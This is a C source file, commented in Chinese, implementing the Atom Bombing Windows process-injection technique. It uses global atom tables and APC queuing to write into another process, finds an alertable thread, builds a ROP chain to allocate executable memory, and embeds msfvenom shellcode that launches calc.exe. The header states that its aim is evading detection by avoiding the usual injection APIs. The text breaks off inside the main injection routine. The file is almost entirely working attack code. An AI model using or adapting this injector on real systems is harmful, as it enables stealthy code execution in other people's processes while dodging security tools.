/*
 * Atom Bombing - 全局 Atom 表代码注入
 *
 * 核心原理：
 * 1. 利用全局 Atom 表作为跨进程数据传输通道
 * 2. 使用 APC + GlobalGetAtomNameW 将 Atom 数据写入目标进程
 * 3. 构建 ROP 链分配可执行内存并复制 shellcode
 * 4. 通过 APC 劫持线程上下文执行 ROP 链
 *
 * 绕过检测：
 * - 不使用 VirtualAllocEx
 * - 不使用 WriteProcessMemory
 * - 不使用 CreateRemoteThread
 * - 全部使用合法 Windows API
 *
 * MITRE ATT&CK: T1055.003 (Thread Execution Hijacking)
 */

#include <windows.h>
#include <stdio.h>
#include <stddef.h>
#include <tlhelp32.h>
#include <winternl.h>

// ========================================
// 常量定义
// ========================================

#define RTL_MAXIMUM_ATOM_LENGTH 255  // Atom 最大长度

// ========================================
// 错误处理系统（参考原始实现）
// ========================================

typedef enum _ESTATUS {
    ESTATUS_INVALID = -1,
    ESTATUS_SUCCESS = 0,

    // Atom 操作错误
    ESTATUS_GLOBALADDATOMW_FAILED = 0x100,
    ESTATUS_GLOBALGETATOMNAMEW_FAILED,
    ESTATUS_GLOBALDELETEATOM_FAILED,
    ESTATUS_ATOM_WRITE_VERIFICATION_FAILED,

    // 进程/线程错误
    ESTATUS_OPENPROCESS_FAILED,
    ESTATUS_OPENTHREAD_FAILED,
    ESTATUS_CREATETOOLHELP32SNAPSHOT_ERROR,
    ESTATUS_PROCESS32FIRST_ERROR,
    ESTATUS_PROCESS_NOT_FOUND,
    ESTATUS_NO_THREADS_FOUND,

    // APC 操作错误
    ESTATUS_NTQUEUEAPCTHREAD_FAILED,
    ESTATUS_SUSPENDTHREAD_FAILED,
    ESTATUS_RESUMETHREAD_FAILED,
    ESTATUS_QUEUEUSERAPC_FAILED,

    // Alertable 线程检测错误
    ESTATUS_NO_ALERTABLE_THREADS_FOUND,
    ESTATUS_CREATEEVENT_FAILED,
    ESTATUS_DUPLICATEHANDLE_FAILED,
    ESTATUS_WAITFORMULTIPLEOBJECTS_FAILED,

    // 内存操作错误
    ESTATUS_HEAPALLOC_FAILED,
    ESTATUS_READPROCESSMEMORY_FAILED,
    ESTATUS_BUFFER_CONTAINS_NULL,

    // 模块/函数错误
    ESTATUS_GETMODULEHANDLEA_FAILED,
    ESTATUS_GETPROCADDRESS_FAILED,
    ESTATUS_LOADLIBRARY_FAILED,

    // 上下文操作错误
    ESTATUS_GETTHREADCONTEXT_FAILED,
    ESTATUS_SETTHREADCONTEXT_FAILED,

    // ROP 链错误
    ESTATUS_RET_GADGET_NOT_FOUND,
    ESTATUS_CODE_CAVE_NOT_FOUND,

} ESTATUS, *PESTATUS;

#define ESTATUS_FAILED(eStatus) (ESTATUS_SUCCESS != eStatus)

// ========================================
// 类型定义
// ========================================

typedef NTSTATUS (NTAPI *pfnNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

typedef NTSTATUS (NTAPI *pfnNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// 函数指针结构（传递给 shellcode）
typedef struct _FUNCTION_POINTERS {
    PVOID pfnLoadLibraryA;
    PVOID pfnGetProcAddress;
} FUNCTION_POINTERS, *PFUNCTION_POINTERS;

// ROP 链结构
typedef struct _ROP_CHAIN {
    // NtAllocateVirtualMemory 的返回地址
    PVOID pvMemcpy;

    // NtAllocateVirtualMemory 参数
    HANDLE hProcess;
    PVOID *pBaseAddress;
    ULONG_PTR ZeroBits;
    PSIZE_T pRegionSize;
    ULONG AllocationType;
    ULONG Protect;

    // memcpy 的返回地址（RET gadget）
    PVOID pvRetGadget;

    // memcpy 参数
    PVOID Destination;
    PVOID Source;
    SIZE_T Length;
} ROP_CHAIN, *PROP_CHAIN;

// ========================================
// 函数声明
// ========================================

// Alertable 线程检测函数
ESTATUS NtQueueApcThreadWrapper(HANDLE hThread, PVOID pfnApcRoutine, PVOID pvArg1, PVOID pvArg2, PVOID pvArg3);
ESTATUS NtQueueApcThreadWaitForSingleObjectEx(HANDLE hRemoteThread, HANDLE hWaitHandle, DWORD dwWaitMilliseconds, BOOL bWaitAlertable);
ESTATUS QueueUserApcWrapperAndKeepAlertable(HANDLE hThread, PAPCFUNC pfnAPC, ULONG_PTR dwData);
ESTATUS ApcSetEventAndKeepAlertable(HANDLE hThread, HANDLE hRemoteHandle);
ESTATUS FindAlertableThread(HANDLE hProcess, PHANDLE phAlertableThread);

// Atom 验证函数
ESTATUS WasAtomWrittenSuccessfully(ATOM tAtom, LPWSTR pswzExpectedBuffer, BOOL *pbWasAtomWrittenSuccessfully);
ESTATUS AddNullTerminatedAtomAndVerifyW(LPWSTR pswzBuffer, ATOM *ptAtom);

// ========================================
// 辅助函数
// ========================================

// 通过进程名获取 PID
DWORD GetProcessIdByName(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot 失败: %lu\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        printf("[!] Process32First 失败: %lu\n", GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

// 枚举进程的线程
DWORD* EnumerateThreads(DWORD pid, DWORD *threadCount) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    THREADENTRY32 te32 = {0};
    te32.dwSize = sizeof(THREADENTRY32);

    // 统计线程数
    DWORD count = 0;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                count++;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    if (count == 0) {
        CloseHandle(hSnapshot);
        return NULL;
    }

    // 分配内存并收集线程 ID
    DWORD *threads = (DWORD *)malloc(count * sizeof(DWORD));
    if (!threads) {
        CloseHandle(hSnapshot);
        return NULL;
    }

    te32.dwSize = sizeof(THREADENTRY32);
    DWORD index = 0;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                threads[index++] = te32.th32ThreadID;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);
    *threadCount = count;
    return threads;
}

// 枚举进程的线程并打开句柄
ESTATUS EnumProcessThreads(
    HANDLE hProcess,
    PHANDLE *pphProcessThreadsHandles,
    DWORD *pcbProcessThreadsHandlesSize,
    DWORD *pdwNumberOfProcessThreads
) {
    ESTATUS eReturn = ESTATUS_INVALID;
    DWORD dwProcessId = GetProcessId(hProcess);
    HANDLE hSnapshot = INVALID_HANDLE_VALUE;
    THREADENTRY32 te32 = {0};
    DWORD dwThreadCount = 0;
    PHANDLE phThreads = NULL;
    DWORD dwIndex = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        eReturn = ESTATUS_CREATETOOLHELP32SNAPSHOT_ERROR;
        goto lblCleanup;
    }

    te32.dwSize = sizeof(THREADENTRY32);

    // 统计线程数
    if (!Thread32First(hSnapshot, &te32)) {
        eReturn = ESTATUS_PROCESS32FIRST_ERROR;
        goto lblCleanup;
    }

    do {
        if (te32.th32OwnerProcessID == dwProcessId) {
            dwThreadCount++;
        }
    } while (Thread32Next(hSnapshot, &te32));

    if (dwThreadCount == 0) {
        eReturn = ESTATUS_NO_THREADS_FOUND;
        goto lblCleanup;
    }

    // 分配句柄数组
    phThreads = (PHANDLE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwThreadCount * sizeof(HANDLE));
    if (NULL == phThreads) {
        eReturn = ESTATUS_HEAPALLOC_FAILED;
        goto lblCleanup;
    }

    // 打开所有线程句柄
    te32.dwSize = sizeof(THREADENTRY32);
    Thread32First(hSnapshot, &te32);

    do {
        if (te32.th32OwnerProcessID == dwProcessId) {
            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
            if (NULL != hThread) {
                phThreads[dwIndex++] = hThread;
            }
        }
    } while (Thread32Next(hSnapshot, &te32));

    *pphProcessThreadsHandles = phThreads;
    *pcbProcessThreadsHandlesSize = dwThreadCount * sizeof(HANDLE);
    *pdwNumberOfProcessThreads = dwThreadCount;
    eReturn = ESTATUS_SUCCESS;

lblCleanup:
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        CloseHandle(hSnapshot);
    }
    return eReturn;
}

/**
 * 查找 Alertable 线程
 * 参考：main_FindAlertableThread
 */
ESTATUS FindAlertableThread(HANDLE hProcess, PHANDLE phAlertableThread) {
    ESTATUS eReturn = ESTATUS_INVALID;
    PHANDLE phProcessThreadsHandles = NULL;
    DWORD cbProcessThreadsHandlesSize = 0;
    DWORD dwNumberOfProcessThreads = 0;
    BOOL bErr = FALSE;
    DWORD dwErr = 0;
    HANDLE hAlertableThread = NULL;
    PHANDLE phLocalEvents = NULL;
    PHANDLE phRemoteEvents = NULL;

    eReturn = EnumProcessThreads(
        hProcess,
        &phProcessThreadsHandles,
        &cbProcessThreadsHandlesSize,
        &dwNumberOfProcessThreads
    );
    if (ESTATUS_FAILED(eReturn)) {
        goto lblCleanup;
    }

    // 预热所有线程，使其进入 Alertable 状态
    for (DWORD dwIndex = 0; dwIndex < dwNumberOfProcessThreads; dwIndex++) {
        HANDLE hThread = phProcessThreadsHandles[dwIndex];

        eReturn = NtQueueApcThreadWaitForSingleObjectEx(
            hThread,
            GetCurrentThread(),
            5000,
            TRUE
        );
        if (ESTATUS_FAILED(eReturn)) {
            continue;
        }
    }

    // 创建本地 Event 数组
    phLocalEvents = (PHANDLE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNumberOfProcessThreads * sizeof(HANDLE));
    if (NULL == phLocalEvents) {
        eReturn = ESTATUS_HEAPALLOC_FAILED;
        goto lblCleanup;
    }

    // 创建远程 Event 数组
    phRemoteEvents = (PHANDLE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNumberOfProcessThreads * sizeof(HANDLE));
    if (NULL == phRemoteEvents) {
        eReturn = ESTATUS_HEAPALLOC_FAILED;
        goto lblCleanup;
    }

    // 为每个线程创建 Event 并复制到远程进程
    for (DWORD dwIndex = 0; dwIndex < dwNumberOfProcessThreads; dwIndex++) {
        HANDLE hThread = phProcessThreadsHandles[dwIndex];

        phLocalEvents[dwIndex] = CreateEventA(NULL, TRUE, FALSE, NULL);
        if (NULL == phLocalEvents[dwIndex]) {
            eReturn = ESTATUS_CREATEEVENT_FAILED;
            goto lblCleanup;
        }

        bErr = DuplicateHandle(
            GetCurrentProcess(),
            phLocalEvents[dwIndex],
            hProcess,
            &phRemoteEvents[dwIndex],
            0,
            FALSE,
            DUPLICATE_SAME_ACCESS
        );
        if (FALSE == bErr) {
            eReturn = ESTATUS_DUPLICATEHANDLE_FAILED;
            goto lblCleanup;
        }

        // 队列 SetEvent APC
        eReturn = ApcSetEventAndKeepAlertable(hThread, phRemoteEvents[dwIndex]);
        if (ESTATUS_FAILED(eReturn)) {
            goto lblCleanup;
        }
    }

    // 等待任意一个 Event 被触发
    DWORD dwWaitResult = WaitForMultipleObjects(dwNumberOfProcessThreads, phLocalEvents, FALSE, 5000);
    if (WAIT_FAILED == dwWaitResult) {
        eReturn = ESTATUS_WAITFORMULTIPLEOBJECTS_FAILED;
        goto lblCleanup;
    }
    if (WAIT_TIMEOUT == dwWaitResult) {
        eReturn = ESTATUS_NO_ALERTABLE_THREADS_FOUND;
        goto lblCleanup;
    }

    // 找到的 Alertable 线程
    hAlertableThread = phProcessThreadsHandles[dwWaitResult - WAIT_OBJECT_0];

    // 保持该线程永久 Alertable
    eReturn = NtQueueApcThreadWaitForSingleObjectEx(
        hAlertableThread,
        GetCurrentThread(),
        INFINITE,
        TRUE
    );
    if (ESTATUS_FAILED(eReturn)) {
        goto lblCleanup;
    }

    *phAlertableThread = hAlertableThread;
    eReturn = ESTATUS_SUCCESS;

lblCleanup:
    // 清理远程 Event
    if (NULL != phRemoteEvents) {
        for (DWORD dwIndex = 0; dwIndex < dwNumberOfProcessThreads; dwIndex++) {
            if (NULL != phRemoteEvents[dwIndex]) {
                DuplicateHandle(
                    hProcess,
                    phRemoteEvents[dwIndex],
                    NULL,
                    NULL,
                    0,
                    FALSE,
                    DUPLICATE_CLOSE_SOURCE
                );
            }
        }
        HeapFree(GetProcessHeap(), 0, phRemoteEvents);
    }

    // 清理本地 Event
    if (NULL != phLocalEvents) {
        for (DWORD dwIndex = 0; dwIndex < dwNumberOfProcessThreads; dwIndex++) {
            if (NULL != phLocalEvents[dwIndex]) {
                CloseHandle(phLocalEvents[dwIndex]);
            }
        }
        HeapFree(GetProcessHeap(), 0, phLocalEvents);
    }

    // 清理线程句柄（保留 Alertable 线程）
    if (NULL != phProcessThreadsHandles) {
        for (DWORD dwIndex = 0; dwIndex < dwNumberOfProcessThreads; dwIndex++) {
            HANDLE hThread = phProcessThreadsHandles[dwIndex];
            if ((NULL != hThread) && (hAlertableThread != hThread)) {
                CloseHandle(hThread);
            }
        }
        HeapFree(GetProcessHeap(), 0, phProcessThreadsHandles);
    }

    return eReturn;
}

// ========================================
// NtQueueApcThread 辅助函数（参考原始实现）
// ========================================

/**
 * NtQueueApcThread 包装函数
 * 参考：main_NtQueueApcThreadWrapper
 */
ESTATUS NtQueueApcThreadWrapper(
    HANDLE hThread,
    PVOID pfnApcRoutine,
    PVOID pvArg1,
    PVOID pvArg2,
    PVOID pvArg3
) {
    HMODULE hNtdll = NULL;
    HMODULE hUser32 = NULL;
    pfnNtQueueApcThread NtQueueApcThread = NULL;
    NTSTATUS ntStatus = 0;
    ESTATUS eReturn = ESTATUS_INVALID;

    // 加载 user32.dll（Atom 函数需要）
    hUser32 = LoadLibraryW(L"user32.dll");

    hNtdll = GetModuleHandleA("ntdll.dll");
    if (NULL == hNtdll) {
        eReturn = ESTATUS_GETMODULEHANDLEA_FAILED;
        goto lblCleanup;
    }

    NtQueueApcThread = (pfnNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");
    if (NULL == NtQueueApcThread) {
        eReturn = ESTATUS_GETPROCADDRESS_FAILED;
        goto lblCleanup;
    }

    ntStatus = NtQueueApcThread(hThread, pfnApcRoutine, pvArg1, pvArg2, pvArg3);
    if (0 != ntStatus) {
        printf("[!] NtQueueApcThread 失败: 0x%X (%d)\n", ntStatus, ntStatus);
        eReturn = ESTATUS_NTQUEUEAPCTHREAD_FAILED;
        goto lblCleanup;
    }

    eReturn = ESTATUS_SUCCESS;

lblCleanup:
    return eReturn;
}

/**
 * 队列 WaitForSingleObjectEx APC
 * 参考：main_NtQueueApcThreadWaitForSingleObjectEx
 */
ESTATUS NtQueueApcThreadWaitForSingleObjectEx(
    HANDLE hRemoteThread,
    HANDLE hWaitHandle,
    DWORD dwWaitMilliseconds,
    BOOL bWaitAlertable
) {
    ESTATUS eReturn = ESTATUS_INVALID;
    PVOID pfnWaitForSingleObjectEx = NULL;
    HMODULE hKernel32 = NULL;

    hKernel32 = GetModuleHandleA("kernel32.dll");
    if (NULL == hKernel32) {
        eReturn = ESTATUS_GETMODULEHANDLEA_FAILED;
        goto lblCleanup;
    }

    pfnWaitForSingleObjectEx = GetProcAddress(hKernel32, "WaitForSingleObjectEx");
    if (NULL == pfnWaitForSingleObjectEx) {
        eReturn = ESTATUS_GETPROCADDRESS_FAILED;
        goto lblCleanup;
    }

    eReturn = NtQueueApcThreadWrapper(
        hRemoteThread,
        pfnWaitForSingleObjectEx,
        hWaitHandle,
        (PVOID)(ULONG_PTR)dwWaitMilliseconds,
        (PVOID)(ULONG_PTR)bWaitAlertable
    );
    if (ESTATUS_FAILED(eReturn)) {
        goto lblCleanup;
    }

    eReturn = ESTATUS_SUCCESS;

lblCleanup:
    return eReturn;
}

/**
 * 队列 QueueUserAPC 并保持线程 Alertable
 * 参考：main_QueueUserApcWrapperAndKeepAlertable
 */
ESTATUS QueueUserApcWrapperAndKeepAlertable(
    HANDLE hThread,
    PAPCFUNC pfnAPC,
    ULONG_PTR dwData
) {
    ESTATUS eReturn = ESTATUS_INVALID;
    DWORD dwErr = 0;

    dwErr = SuspendThread(hThread);
    if (((DWORD)-1) == dwErr) {
        eReturn = ESTATUS_SUSPENDTHREAD_FAILED;
        printf("[!] SuspendThread 失败: %d\n", GetLastError());
        goto lblCleanup;
    }

    dwErr = QueueUserAPC(pfnAPC, hThread, dwData);
    if (0 == dwErr) {
        eReturn = ESTATUS_QUEUEUSERAPC_FAILED;
        printf("[!] QueueUserAPC 失败: %d\n", GetLastError());
        goto lblCleanup;
    }

    eReturn = NtQueueApcThreadWaitForSingleObjectEx(
        hThread,
        GetCurrentThread(),
        5000,
        TRUE
    );
    if (ESTATUS_FAILED(eReturn)) {
        goto lblCleanup;
    }

    dwErr = ResumeThread(hThread);
    if (((DWORD)-1) == dwErr) {
        printf("[!] ResumeThread 失败: %d\n", GetLastError());
        eReturn = ESTATUS_RESUMETHREAD_FAILED;
        goto lblCleanup;
    }

    eReturn = ESTATUS_SUCCESS;

lblCleanup:
    return eReturn;
}

/**
 * 通过 APC 设置 Event
 * 参考：main_ApcSetEventAndKeepAlertable
 */
ESTATUS ApcSetEventAndKeepAlertable(HANDLE hThread, HANDLE hRemoteHandle) {
    ESTATUS eReturn = ESTATUS_INVALID;

    eReturn = QueueUserApcWrapperAndKeepAlertable(
        hThread,
        (PAPCFUNC)SetEvent,
        (ULONG_PTR)hRemoteHandle
    );
    if (ESTATUS_FAILED(eReturn)) {
        goto lblCleanup;
    }

    eReturn = ESTATUS_SUCCESS;

lblCleanup:
    return eReturn;
}

// ========================================
// Atom 写入验证函数（参考原始实现）
// ========================================

/**
 * 验证 Atom 是否成功写入
 * 参考：main_WasAtomWrittenSuccessfully
 */
ESTATUS WasAtomWrittenSuccessfully(
    ATOM tAtom,
    LPWSTR pswzExpectedBuffer,
    BOOL *pbWasAtomWrittenSuccessfully
) {
    LPWSTR pswzCheckBuffer = NULL;
    DWORD cbCheckBuffer = 0;
    ESTATUS eReturn = ESTATUS_INVALID;
    UINT uiRet = 0;
    HMODULE hUser32 = NULL;
    BOOL bWasAtomWrittenSuccessfully = FALSE;

    // 加载 user32.dll（Atom 函数需要）
    hUser32 = LoadLibraryW(L"user32.dll");
    if (NULL == hUser32) {
        eReturn = ESTATUS_LOADLIBRARY_FAILED;
        goto lblCleanup;
    }

    cbCheckBuffer = (wcslen(pswzExpectedBuffer) + 1) * sizeof(WCHAR);

    pswzCheckBuffer = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbCheckBuffer);
    if (NULL == pswzCheckBuffer) {
        printf("[!] HeapAlloc 失败: 0x%X (%d)\n", GetLastError(), GetLastError());
        eReturn = ESTATUS_HEAPALLOC_FAILED;
        goto lblCleanup;
    }

    uiRet = GlobalGetAtomNameW(tAtom, pswzCheckBuffer, cbCheckBuffer / sizeof(WCHAR));
    if (0 == uiRet) {
        printf("[!] GlobalGetAtomNameW 失败: 0x%X (%d)\n", GetLastError(), GetLastError());
        eReturn = ESTATUS_GLOBALGETATOMNAMEW_FAILED;
        goto lblCleanup;
    }

    bWasAtomWrittenSuccessfully = (0 == memcmp(pswzCheckBuffer, pswzExpectedBuffer, cbCheckBuffer));

    eReturn = ESTATUS_SUCCESS;
    *pbWasAtomWrittenSuccessfully = bWasAtomWrittenSuccessfully;

lblCleanup:
    if (NULL != pswzCheckBuffer) {
        HeapFree(GetProcessHeap(), 0, pswzCheckBuffer);
        pswzCheckBuffer = NULL;
    }
    return eReturn;
}

/**
 * 添加 Atom 并验证，失败时重试
 * 参考：main_AddNullTerminatedAtomAndVerifyW
 */
ESTATUS AddNullTerminatedAtomAndVerifyW(LPWSTR pswzBuffer, ATOM *ptAtom) {
    ATOM tAtom = 0;
    ESTATUS eReturn = ESTATUS_INVALID;
    HMODULE hUser32 = NULL;
    BOOL bWasAtomWrittenSuccessfully = FALSE;

    // 加载 user32.dll（Atom 函数需要）
    hUser32 = LoadLibraryW(L"user32.dll");
    if (NULL == hUser32) {
        eReturn = ESTATUS_LOADLIBRARY_FAILED;
        goto lblCleanup;
    }

    do {
        tAtom = GlobalAddAtomW(pswzBuffer);
        if (0 == tAtom) {
            printf("[!] GlobalAddAtomW 失败: 0x%X (%d)\n", GetLastError(), GetLastError());
            eReturn = ESTATUS_GLOBALADDATOMW_FAILED;
            goto lblCleanup;
        }

        eReturn = WasAtomWrittenSuccessfully(tAtom, pswzBuffer, &bWasAtomWrittenSuccessfully);
        if (ESTATUS_FAILED(eReturn)) {
            goto lblCleanup;
        }

        if (FALSE != bWasAtomWrittenSuccessfully) {
            break;
        }

        // 写入失败，删除 Atom 并重试
        for (int i = 0; i < 0x2; i++) {
            SetLastError(ERROR_SUCCESS);
            GlobalDeleteAtom(tAtom);
            if (ERROR_SUCCESS != GetLastError()) {
                printf("[!] GlobalDeleteAtom 失败: 0x%X (%d)\n", GetLastError(), GetLastError());
                eReturn = ESTATUS_GLOBALDELETEATOM_FAILED;
                goto lblCleanup;
            }
        }
    } while (FALSE == bWasAtomWrittenSuccessfully);

    eReturn = ESTATUS_SUCCESS;
    *ptAtom = tAtom;

lblCleanup:
    return eReturn;
}

// 使用 Atom 表写入数据到远程进程（带验证和重试）
BOOL AtomWriteMemory(HANDLE hThread, PVOID remoteAddr, const void *data, SIZE_T size) {
    pfnNtQueueApcThread NtQueueApcThread = NULL;
    PVOID pfnGlobalGetAtomNameW = NULL;

    // 获取 NtQueueApcThread
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    NtQueueApcThread = (pfnNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");
    if (!NtQueueApcThread) {
        printf("[!] 无法获取 NtQueueApcThread\n");
        return FALSE;
    }

    // 获取 GlobalGetAtomNameW
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    pfnGlobalGetAtomNameW = GetProcAddress(hKernel32, "GlobalGetAtomNameW");
    if (!pfnGlobalGetAtomNameW) {
        printf("[!] 无法获取 GlobalGetAtomNameW\n");
        return FALSE;
    }

    // 加载 user32.dll（Atom 函数需要）
    LoadLibraryA("user32.dll");

    const BYTE *dataPtr = (const BYTE *)data;
    SIZE_T bytesWritten = 0;

    printf("[*] 使用 Atom 表写入 %lu 字节到 0x%p\n", (unsigned long)size, remoteAddr);

    while (bytesWritten < size) {
        // 计算本次写入的大小
        SIZE_T chunkSize = min(RTL_MAXIMUM_ATOM_LENGTH * sizeof(WCHAR), size - bytesWritten);

        // 准备缓冲区（需要是 WCHAR）
        WCHAR buffer[RTL_MAXIMUM_ATOM_LENGTH + 1] = {0};
        memcpy(buffer, dataPtr + bytesWritten, chunkSize);

        // 添加 Atom 并验证（带重试机制）
        ATOM atom = 0;
        ESTATUS eStatus = AddNullTerminatedAtomAndVerifyW(buffer, &atom);
        if (ESTATUS_FAILED(eStatus) || atom == 0) {
            printf("[!] AddNullTerminatedAtomAndVerifyW 失败: 0x%X\n", eStatus);
            return FALSE;
        }

        // 挂起线程
        SuspendThread(hThread);

        // 使用 APC 调用 GlobalGetAtomNameW 写入数据
        NTSTATUS status = NtQueueApcThread(
            hThread,
            pfnGlobalGetAtomNameW,
            (PVOID)(ULONG_PTR)atom,
            (PVOID)((BYTE *)remoteAddr + bytesWritten),
            (PVOID)(chunkSize + sizeof(WCHAR))
        );

        if (status != 0) {
            printf("[!] NtQueueApcThread 失败: 0x%lX\n", status);
            ResumeThread(hThread);
            GlobalDeleteAtom(atom);
            return FALSE;
        }

        // 恢复线程让 APC 执行
        ResumeThread(hThread);
        Sleep(50);  // 等待 APC 执行

        // 删除 Atom
        GlobalDeleteAtom(atom);

        bytesWritten += chunkSize;
        printf("[+] 已写入 %lu/%lu 字节\n", (unsigned long)bytesWritten, (unsigned long)size);
    }

    return TRUE;
}

// 查找 RET gadget
PVOID FindRetGadget() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        return NULL;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE *)hNtdll + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    // 查找 .text 节
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSection[i].Name, ".text", 5) == 0) {
            BYTE *start = (BYTE *)hNtdll + pSection[i].VirtualAddress;
            DWORD size = pSection[i].SizeOfRawData;

            // 查找 0xC3 (RET)
            for (DWORD j = 0; j < size; j++) {
                if (start[j] == 0xC3) {
                    return (PVOID)(start + j);
                }
            }
        }
    }

    return NULL;
}

// 查找代码洞（在 kernelbase.dll 的 .data 节末尾）
PVOID FindCodeCave() {
    HMODULE hModule = GetModuleHandleA("kernelbase.dll");
    if (!hModule) {
        return NULL;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE *)hModule + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    // 查找 .data 节
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSection[i].Name, ".data", 5) == 0) {
            return (PVOID)((BYTE *)hModule + pSection[i].VirtualAddress + pSection[i].SizeOfRawData);
        }
    }

    return NULL;
}

// 构建 ROP 链
BOOL BuildRopChain(PVOID ropLocation, PVOID shellcodeLocation, SIZE_T shellcodeSize, ROP_CHAIN *pRopChain) {
    ROP_CHAIN rop = {0};

    // 获取必要的函数地址
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    rop.pvMemcpy = GetProcAddress(hNtdll, "memcpy");
    if (!rop.pvMemcpy) {
        printf("[!] 无法获取 memcpy\n");
        return FALSE;
    }

    rop.pvRetGadget = FindRetGadget();
    if (!rop.pvRetGadget) {
        printf("[!] 无法找到 RET gadget\n");
        return FALSE;
    }

    // 设置 NtAllocateVirtualMemory 参数
    rop.hProcess = (HANDLE)-1;  // Current process
    rop.pBaseAddress = (PVOID *)((BYTE *)ropLocation + offsetof(ROP_CHAIN, Destination));
    rop.ZeroBits = 0;
    rop.pRegionSize = (PSIZE_T)((BYTE *)ropLocation + offsetof(ROP_CHAIN, Length));
    rop.AllocationType = MEM_COMMIT | MEM_RESERVE;
    rop.Protect = PAGE_EXECUTE_READWRITE;

    // 设置 memcpy 参数
    rop.Destination = NULL;  // 将被 NtAllocateVirtualMemory 填充
    rop.Source = shellcodeLocation;
    rop.Length = shellcodeSize;

    *pRopChain = rop;
    return TRUE;
}

// ========================================
// Shellcode（简化版 - 执行 calc.exe）
// ========================================

// msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f c
unsigned char shellcode[] =
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
    "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
    "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
    "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
    "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
    "\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
    "\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
    "\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

// ========================================
// 主注入函数
// ========================================

BOOL AtomBombingInject(DWORD pid) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    DWORD *threads = NULL;
    DWORD threadCount = 0;
    PVOID codeCave = NULL;
    ROP_CHAIN ropChain = {0};
    CONTEXT ctx = {0};
    BOOL success = FALSE;

    printf("[*] 步骤 1: 打开目标进程 (PID: %lu)\n", pid);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[!] OpenProcess 失败: %lu\n", GetLastError());
        goto cleanup;
    }

    printf("[*] 步骤 2: 枚举进程线程\n");
    threads = EnumerateThreads(pid, &threadCount);
    if (!threads || threadCount == 0) {
